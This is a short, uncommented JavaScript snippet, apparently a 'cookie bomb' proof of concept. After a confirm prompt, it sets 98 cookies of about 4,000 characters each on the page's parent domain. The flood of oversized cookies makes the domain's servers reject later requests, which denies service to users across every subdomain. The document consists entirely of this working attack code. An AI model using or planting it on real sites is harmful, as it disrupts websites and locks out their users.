var base_domain = document.domain.substr(document.domain.indexOf('.'));
var pollution = Array(4000).join('a');

if (confirm('Do you want to Bomb ' + base_domain + '?'))
{
  for (var i = 1 ; i < 99 ; i++)
  {
    document.cookie='bomb' + i + '=' + pollution + ';Domain=' + base_domain + ';path=/';
  }
}
